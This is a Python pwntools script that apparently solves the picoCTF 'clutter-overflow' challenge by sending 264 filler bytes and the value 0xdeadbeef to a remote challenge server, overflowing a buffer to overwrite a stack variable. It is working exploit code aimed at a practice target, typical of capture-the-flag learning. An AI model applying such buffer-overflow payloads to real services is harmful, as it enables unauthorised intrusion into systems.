import os
from pwn import *
###################setup file and elf files####################
level = "clutter-overflow"
ip = "mars.picoctf.net:31890"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./chall")

######################start process##########################

# r = process("./chall")
r = remote(ip.split(':')[0], ip.split(':')[1])

##############simple overflow code###################
overflow = b'a' * 264
payload = overflow + struct.pack("l", 0xdeadbeef)
r.sendlineafter("?", payload)
#####################collecting result and shell#######################

log.info(r.recvall())
r.close()